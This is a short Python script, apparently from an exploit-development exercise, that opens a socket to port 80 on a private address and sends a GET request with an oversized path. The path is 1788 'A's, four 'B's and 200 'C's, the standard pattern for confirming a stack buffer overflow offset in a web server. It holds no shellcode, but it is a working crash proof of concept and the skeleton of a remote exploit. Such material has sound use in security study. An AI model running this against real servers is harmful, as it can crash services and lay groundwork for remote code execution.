import socket

metodo_entrada = "GET"
cabecera = "HTTP/1.1 \r\n\r\n"
buffer = "A"*1788 + "B"*4 + "C"*200
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.21',80))
s.send(metodo_entrada + buffer + cabecera)
s.recv(1024)
s.close()
